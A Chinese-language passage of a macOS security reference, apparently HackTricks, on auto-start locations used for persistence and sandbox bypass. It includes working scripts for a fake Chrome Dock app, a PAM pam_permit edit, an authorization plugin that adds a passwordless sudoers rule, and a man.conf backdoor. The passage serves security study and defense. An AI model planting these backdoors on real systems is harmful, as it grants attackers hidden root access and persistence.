文件夹操作是由文件夹中的更改自动触发的脚本，例如添加、删除项目，或其他操作，如打开或调整文件夹窗口大小。这些操作可用于各种任务，并且可以通过不同方式触发，如使用 Finder UI 或终端命令。

设置文件夹操作时，您可以选择以下选项：

1. 使用 [Automator](https://support.apple.com/guide/automator/welcome/mac) 制作文件夹操作工作流，并将其安装为服务。
2. 通过文件夹上下文菜单中的文件夹操作设置手动附加脚本。
3. 利用 OSAScript 向 `System Events.app` 发送苹果事件消息，以通过编程方式设置文件夹操作。
- 这种方法特别适用于将操作嵌入系统中，提供一定程度的持久性。

以下脚本是文件夹操作可执行的示例：
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
要使上述脚本可被文件夹操作使用，请使用以下命令进行编译：
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
在脚本编译完成后，通过执行以下脚本来设置文件夹操作。该脚本将全局启用文件夹操作，并将先前编译的脚本特定附加到桌面文件夹。
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
使用以下命令运行设置脚本：
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* 通过 GUI 实现这种持久性的方法如下：

这是将被执行的脚本：

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

使用以下命令编译：`osacompile -l JavaScript -o folder.scpt source.js`

移动到：
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
然后，打开`Folder Actions Setup`应用程序，选择**您想要监视的文件夹**，然后在您的情况下选择**`folder.scpt`**（在我的情况下，我将其命名为output2.scp）：

<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

现在，如果您使用**Finder**打开该文件夹，您的脚本将被执行。

此配置存储在以base64格式存储的**plist**中，位于**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**。

现在，让我们尝试在没有GUI访问权限的情况下准备这个持久性：

1. **复制 `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** 到 `/tmp` 以备份它：
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **删除**您刚刚设置的文件夹操作：

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

现在我们有了一个空的环境

3. 复制备份文件：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. 打开Folder Actions Setup.app以使用此配置：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
对我来说这个方法不起作用，但这是来自文档的指令 :(
{% endhint %}

### Dock快捷方式

文档：[https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* 用于绕过沙盒的有用方法：[✅](https://emojipedia.org/check-mark-button)
* 但您需要在系统内安装了一个恶意应用程序
* TCC绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

* `~/Library/Preferences/com.apple.dock.plist`
* **触发条件**：当用户点击Dock中的应用程序时

#### 描述和利用

Dock中显示的所有应用程序都在plist文件中指定：**`~/Library/Preferences/com.apple.dock.plist`**

只需使用以下命令即可**添加一个应用程序**：

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

通过一些**社会工程**，你可以在 dock 中**冒充例如 Google Chrome**，实际上执行你自己的脚本：
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### 颜色选择器

Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* 用于绕过沙盒：[🟠](https://emojipedia.org/large-orange-circle)
* 需要发生一个非常具体的动作
* 你将进入另一个沙盒
* TCC绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

* `/Library/ColorPickers`
* 需要 root 权限
* 触发条件：使用颜色选择器
* `~/Library/ColorPickers`
* 触发条件：使用颜色选择器

#### 描述 & 攻击

**编译一个颜色选择器** bundle 与你的代码（你可以使用[**这个作为例子**](https://github.com/viktorstrate/color-picker-plus)），并添加一个构造函数（就像[屏幕保护程序部分](macos-auto-start-locations.md#screen-saver)中的那样），然后将 bundle 复制到 `~/Library/ColorPickers`。

然后，当颜色选择器被触发时，你的代码也应该被执行。

请注意，加载你的库的二进制文件有一个**非常严格的沙盒**：`/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync插件

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* 用于绕过沙盒: **否，因为您需要执行自己的应用程序**
* TCC绕过: ???

#### 位置

* 特定应用程序

#### 描述和利用

一个带有Finder Sync扩展的应用程序示例[**可以在这里找到**](https://github.com/D00MFist/InSync)。

应用程序可以拥有`Finder Sync扩展`。这个扩展将放在将要执行的应用程序中。此外，为了使扩展能够执行其代码，它**必须使用一些有效的苹果开发者证书进行签名**，它必须**被沙盒化**（尽管可以添加宽松的例外），并且必须注册到类似于：
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### 屏幕保护程序

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* 有用于绕过沙盒：[🟠](https://emojipedia.org/large-orange-circle)
* 但最终会陷入常见应用程序沙盒
* TCC绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

* `/System/Library/Screen Savers`
* 需要root权限
* **触发器**：选择屏幕保护程序
* `/Library/Screen Savers`
* 需要root权限
* **触发器**：选择屏幕保护程序
* `~/Library/Screen Savers`
* **触发器**：选择屏幕保护程序

<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 描述与利用

在Xcode中创建一个新项目，并选择模板生成一个新的**屏幕保护程序**。然后，将代码添加到其中，例如以下代码以生成日志。

**构建**它，并将`.saver`捆绑包复制到**`~/Library/Screen Savers`**。然后，打开屏幕保护程序GUI，只需单击它，就应该生成大量日志：

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
请注意，因为在加载此代码的二进制文件的授权中（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）您可以找到**`com.apple.security.app-sandbox`**，因此您将处于**常见应用程序沙箱内**。
{% endhint %}

Saver 代码:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight插件

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* 有用于绕过沙盒：[🟠](https://emojipedia.org/large-orange-circle)
* 但最终会进入一个应用程序沙盒
* TCC绕过：[🔴](https://emojipedia.org/large-red-circle)
* 沙盒看起来非常有限

#### 位置

* `~/Library/Spotlight/`
* **触发器**：创建一个由Spotlight插件管理的扩展名的新文件。
* `/Library/Spotlight/`
* **触发器**：创建一个由Spotlight插件管理的扩展名的新文件。
* 需要Root权限
* `/System/Library/Spotlight/`
* **触发器**：创建一个由Spotlight插件管理的扩展名的新文件。
* 需要Root权限
* `Some.app/Contents/Library/Spotlight/`
* **触发器**：创建一个由Spotlight插件管理的扩展名的新文件。
* 需要新的应用程序

#### 描述和利用

Spotlight是macOS内置的搜索功能，旨在为用户提供**快速和全面访问计算机上的数据**。\
为了促进这种快速搜索功能，Spotlight维护一个**专有数据库**，通过**解析大多数文件**创建索引，使得可以通过文件名和内容快速搜索。

Spotlight的基本机制涉及一个名为'mds'的中央进程，代表**'元数据服务器'**。该进程协调整个Spotlight服务。除此之外，还有多个执行各种维护任务的'mdworker'守护程序，例如索引不同文件类型（`ps -ef | grep mdworker`）。这些任务通过Spotlight导入器插件或**".mdimporter bundles**"实现，这些插件使Spotlight能够理解和索引各种文件格式的内容。

这些插件或**`.mdimporter`** bundles位于先前提到的位置，如果出现新的bundle，它将在一分钟内加载（无需重新启动任何服务）。这些bundles需要指示它们可以管理哪些**文件类型和扩展名**，这样，当创建具有指定扩展名的新文件时，Spotlight将使用它们。

可以通过运行以下命令**找到所有加载的`mdimporters`**：
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
例如，**/Library/Spotlight/iBooksAuthor.mdimporter** 用于解析这些类型的文件（扩展名为 `.iba` 和 `.book` 等）:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
如果您检查其他`mdimporter`的Plist文件，可能找不到条目**`UTTypeConformsTo`**。这是因为这是一个内置的_统一类型标识符_([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier))，不需要指定扩展名。

此外，系统默认插件始终优先，因此攻击者只能访问那些苹果自己的`mdimporters`未索引的文件。
{% endhint %}

要创建自己的导入器，您可以从这个项目开始：[https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)，然后更改名称，**`CFBundleDocumentTypes`**并添加**`UTImportedTypeDeclarations`**以支持您想要支持的扩展名，并在**`schema.xml`**中反映它们。\
然后**更改**函数**`GetMetadataForFile`**的代码，以在创建具有处理的扩展名的文件时执行您的有效负载。

最后**构建并复制您的新`.mdimporter`**到三个先前位置之一，您可以通过**监视日志**或检查**`mdimport -L.`**来检查它何时加载。

### ~~首选项窗格~~

{% hint style="danger" %}
看起来这似乎不再起作用。
{% endhint %}

撰写：[https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* 用于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 需要特定用户操作
* TCC绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### 描述

看起来这似乎不再起作用。

## Root沙箱绕过

{% hint style="success" %}
在这里，您可以找到有用于**绕过沙箱**的起始位置，允许您通过**将内容写入文件**来**执行某些操作**，而且需要**root**权限和/或其他**奇怪的条件**。
{% endhint %}

### 周期性

撰写：[https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* 用于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 但您需要root权限
* TCC绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

* `/etc/periodic/daily`、`/etc/periodic/weekly`、`/etc/periodic/monthly`、`/usr/local/etc/periodic`
* 需要root权限
* **触发器**：时间到达时
* `/etc/daily.local`、`/etc/weekly.local`或`/etc/monthly.local`
* 需要root权限
* **触发器**：时间到达时

#### 描述与利用

周期性脚本(**`/etc/periodic`**)会被执行，因为在`/System/Library/LaunchDaemons/com.apple.periodic*`中配置了**启动守护程序**。请注意，存储在`/etc/periodic/`中的脚本将作为**文件的所有者**执行，因此这对于潜在的特权升级不起作用。
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

还有其他定期脚本将在 **`/etc/defaults/periodic.conf`** 中执行：
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
如果您设法编写`/etc/daily.local`、`/etc/weekly.local`或`/etc/monthly.local`中的任何一个文件，它将**迟早被执行**。

{% hint style="warning" %}
请注意，周期性脚本将作为脚本的所有者**执行**。因此，如果常规用户拥有脚本，它将作为该用户执行（这可能会防止特权升级攻击）。
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* 有用于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 但您需要是root
* TCC绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

* 总是需要root权限

#### 描述和利用

由于PAM更专注于**持久性**和恶意软件，而不是在macOS内部轻松执行，因此本博客不会提供详细解释，**请阅读这些文章以更好地理解这种技术**。

使用以下命令检查PAM模块：
```bash
ls -l /etc/pam.d
```
一种滥用PAM的持久性/权限提升技术就是修改模块/etc/pam.d/sudo，在开头添加以下行：
```bash
auth       sufficient     pam_permit.so
```
所以它会**看起来**像这样：
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
因此，任何尝试使用**`sudo`的操作**都将起作用。

{% hint style="danger" %}
请注意，此目录受TCC保护，因此用户很可能会收到要求访问权限的提示。
{% endhint %}

### 授权插件

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* 有用于绕过沙盒：[🟠](https://emojipedia.org/large-orange-circle)
* 但需要以root身份并进行额外配置
* TCC绕过：???

#### 位置

* `/Library/Security/SecurityAgentPlugins/`
* 需要root权限
* 还需要配置授权数据库以使用插件

#### 描述和利用

您可以创建一个授权插件，该插件将在用户登录时执行以保持持久性。有关如何创建这些插件之一的更多信息，请查看先前的写作（请注意，编写不当的插件可能会将您锁在外面，您将需要从恢复模式清理您的Mac）。
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**将** bundle **移动**到要加载的位置：
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最后添加**规则**以加载此插件：
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** 会告诉授权框架需要**调用外部机制进行授权**。此外，**`privileged`** 会使其以 root 用户身份执行。

触发它：
```bash
security authorize com.asdf.asdf
```
然后**staff组应该具有sudo权限**（阅读`/etc/sudoers`以确认）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* 有用于绕过沙盒：[🟠](https://emojipedia.org/large-orange-circle)
* 但您需要是root用户，且用户必须使用man
* TCC绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

* **`/private/etc/man.conf`**
* 需要Root权限
* **`/private/etc/man.conf`**：每当使用man时

#### 描述 & 攻击

配置文件**`/private/etc/man.conf`**指示打开man文档文件时要使用的二进制文件/脚本。因此，可修改可执行文件的路径，以便每当用户使用man阅读文档时，将执行后门。

例如，在**`/private/etc/man.conf`**中设置：
```
MANPAGER /tmp/view
```
然后创建 `/tmp/view` 如下：
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* 有用于绕过沙盒的方法：[🟠](https://emojipedia.org/large-orange-circle)
* 但需要 root 权限和 apache 需要在运行中
* TCC 绕过：[🔴](https://emojipedia.org/large-red-circle)
* Httpd 没有授权

#### 位置

* **`/etc/apache2/httpd.conf`**
* 需要 root 权限
* 触发条件：当 Apache2 启动时

#### 描述 & 攻击

您可以在 `/etc/apache2/httpd.conf` 中指定加载一个模块，添加一行代码，例如：
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

这样，您编译的模块将由Apache加载。唯一的问题是，您需要使用有效的苹果证书进行签名，或者您需要在系统中添加一个新的受信任证书并用其进行签名。

然后，如果需要确保服务器将启动，您可以执行：
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb的代码示例：
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM审计框架

Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* 有助于绕过沙盒: [🟠](https://emojipedia.org/large-orange-circle)
* 但需要root权限，auditd正在运行并引发警告
* TCC绕过: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* **`/etc/security/audit_warn`**
* 需要root权限
* **触发条件**: 当auditd检测到警告时

#### 描述与利用

每当auditd检测到警告时，脚本 **`/etc/security/audit_warn`** 会被 **执行**。因此，您可以在其中添加您的有效负载。
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
### 启动项

{% hint style="danger" %}
**这已经被弃用，因此在这些目录中不应该找到任何内容。**
{% endhint %}

**StartupItem** 是一个应该位于 `/Library/StartupItems/` 或 `/System/Library/StartupItems/` 中的目录。一旦建立了这个目录，它必须包含两个特定的文件：

1. 一个 **rc 脚本**：在启动时执行的 shell 脚本。
2. 一个名为 `StartupParameters.plist` 的 **plist 文件**，其中包含各种配置设置。

确保将 rc 脚本和 `StartupParameters.plist` 文件都正确放置在 **StartupItem** 目录中，以便启动过程识别并利用它们。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="超级服务名称" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
在我的 macOS 中找不到这个组件，欲了解更多信息，请查看 writeup
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

由 Apple 引入的 **emond** 是一种日志记录机制，似乎开发不完善或可能被放弃，但仍然可以访问。虽然对于 Mac 管理员来说并没有特别有益，但这种鲜为人知的服务可能作为威胁行为者的微妙持久性方法，很可能不会被大多数 macOS 管理员注意到。

对于知道其存在的人来说，识别 **emond** 的任何恶意使用是直截了当的。该服务的 LaunchDaemon 寻找要在单个目录中执行的脚本。要检查这一点，可以使用以下命令：
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### 位置

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* 需要 Root 权限
* **触发条件**：使用 XQuartz

#### 描述 & 攻击

XQuartz **不再安装在 macOS 中**，如果您想获取更多信息，请查看 writeup。

### ~~kext~~

{% hint style="danger" %}
即使作为 root 安装 kext 也很复杂，我不认为这是逃离沙盒或实现持久性的好方法（除非您有漏洞利用）
{% endhint %}

#### 位置

要将 KEXT 安装为启动项，需要将其安装在以下位置之一：

* `/System/Library/Extensions`
* 内置于 OS X 操作系统中的 KEXT 文件。
* `/Library/Extensions`
* 第三方软件安装的 KEXT 文件

您可以使用以下命令列出当前加载的 kext 文件：
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
有关[**内核扩展，请查看此部分**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers)。

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### 位置

* **`/usr/local/bin/amstoold`**
* 需要 root 权限

#### 描述 & 利用

显然，`/System/Library/LaunchAgents/com.apple.amstoold.plist` 中的 `plist` 使用了这个二进制文件，同时暴露了一个 XPC 服务... 问题在于该二进制文件不存在，因此您可以在那里放置一些内容，当调用 XPC 服务时，您的二进制文件将被调用。

我在我的 macOS 中找不到这个了。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### 位置

* **`/Library/Preferences/Xsan/.xsanrc`**
* 需要 root 权限
* **触发条件**：当服务运行时（很少）

#### 描述 & 利用

显然，运行此脚本并不是很常见，我甚至在我的 macOS 中找不到它，所以如果您想获取更多信息，请查看 writeup。

### ~~/etc/rc.common~~

{% hint style="danger" %}
**在现代 MacOS 版本中不起作用**
{% endhint %}

还可以在这里放置**将在启动时执行的命令。** 例如常规 rc.common 脚本：
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
